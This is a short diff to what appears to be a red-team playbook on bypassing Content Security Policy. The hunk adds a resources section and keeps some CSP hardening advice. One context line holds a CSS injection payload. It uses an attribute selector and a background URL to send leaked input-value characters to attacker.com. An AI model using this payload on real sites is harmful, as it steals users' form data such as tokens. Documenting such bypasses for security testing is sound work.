@@ -225,3 +225,7 @@ input[value^="b"] { background: url("https://attacker.com/?char=b"); }
 - Migrate from unsafe-inline to strict nonce-based policy
 - Implement strict-dynamic for modern CSP3 browsers
 ```
+
+## Shipped Playbook Resources
+
+- `skill://red-performing-content-security-policy-bypass/references/api-reference.md` — API and execution command reference
